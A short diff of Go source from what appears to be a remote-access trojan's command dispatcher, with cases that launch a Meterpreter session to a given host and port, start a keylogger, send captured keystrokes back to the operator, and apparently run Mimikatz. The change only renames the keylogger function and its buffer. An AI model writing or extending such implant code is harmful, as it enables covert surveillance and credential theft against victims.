@@ -65,9 +65,9 @@ func Execute(command string, target string, args string) {
 		case "meterpreter":
 			Meterpreter(strings.Split(args, ":")[0], strings.Split(args, ":")[1])
 		case "start-keylogger":
-			Keylogger()
+			keyLogger()
 		case "keylog":
-			Send("res", KeyLogs)
+			Send("res", tmpKeylog)
 		case "please":
 			Please(args)
 		case "mimi":
